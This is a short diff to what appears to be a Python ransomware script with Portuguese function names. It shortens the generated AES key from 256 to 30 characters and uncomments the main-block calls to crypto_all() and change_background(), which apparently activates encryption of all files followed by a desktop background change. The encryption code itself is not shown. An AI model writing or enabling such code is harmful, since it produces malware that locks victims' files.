@@ -60,7 +60,7 @@ def gera_chave_AES():
     elif(os.path.isdir(caminho2)):
         caminho_correto = caminho2
 
-    tamanho = 256 # bytes
+    tamanho = 30 # bytes
     caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
     senha = ''
     for char in xrange(tamanho):
@@ -87,8 +87,8 @@ def crypto_all():
 
 # MAIN
 if __name__ == "__main__":
-    #crypto_all()
-    #change_background()
+    crypto_all()
+    change_background()
     pass
 
 
